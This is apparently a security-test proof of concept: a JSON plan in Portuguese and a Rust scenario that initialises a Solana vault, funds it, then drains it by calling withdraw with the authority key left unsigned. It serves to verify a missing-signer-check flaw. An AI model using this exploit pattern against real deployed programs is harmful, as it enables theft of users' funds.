{
  "plan": "Preparamos o vault PDA com seeds [b"vault", authority.key()] via initialize (baseline legitimo, authority assina) e depositamos lamports para dar saldo. O ataque chama withdraw com a mesma authority (chave correta, satisfazendo has_one) mas SEM assinar, e um recipient controlado pelo atacante. Medimos que os lamports do vault diminuem e os do recipient aumentam, provando a drenagem sem assinatura da autoridade.",
  "scenario": "let authority = Pubkey::new_unique();
let recipient = Pubkey::new_unique();
let (vault_pda, _bump) = Pubkey::find_program_address(&[b"vault", authority.as_ref()], &env.program_id);

// Baseline 1: initialize cria o vault PDA (authority assina)
let ix_init = env.anchor_ix("initialize", &(), &[
    AccountMeta::new(vault_pda, false),
    AccountMeta::new(authority, true),
    AccountMeta::new_readonly(solana_program::system_program::id(), false),
]);
let contas_init = vec![
    (vault_pda, empty_account()),
    (authority, wallet(10_000_000_000)),
    system_program_account(),
];
let r_init = env.baseline("initialize cria o vault", &ix_init, &contas_init);

// Baseline 2: deposit para dar saldo ao vault
let ix_dep = env.anchor_ix("deposit", &(&1_000_000_000u64,), &[
    AccountMeta::new(vault_pda, false),
    AccountMeta::new(authority, true),
    AccountMeta::new_readonly(solana_program::system_program::id(), false),
]);
let contas_dep = vec![
    (vault_pda, after(&r_init, &vault_pda).clone()),
    (authority, wallet(10_000_000_000)),
    system_program_account(),
];
let r_dep = env.baseline("deposit no vault", &ix_dep, &contas_dep);

// Ataque: withdraw com authority correta mas SEM assinar
let ix_atk = env.anchor_ix("withdraw", &(&1_000_000_000u64,), &[
    AccountMeta::new(vault_pda, false),
    AccountMeta::new_readonly(authority, false), // NAO assina
    AccountMeta::new(recipient, false),
]);
let contas_atk = vec![
    (vault_pda, after(&r_dep, &vault_pda).clone()),
    (authority, wallet(10_000_000_000)),
    (recipient, wallet(1_000_000)),
];
let r = env.attack("withdraw sem assinatura da authority", &ix_atk, &contas_atk);

if r.program_result == ProgramResult::Success {
    let vault_lamports = after(&r, &vault_pda).lamports();
    let recipient_lamports = after(&r, &recipient).lamports();
    env.effect("vault drenado sem assinatura da authority", vault_lamports < 1_000_000_000 && recipient_lamports > 1_000_000);
}"
}

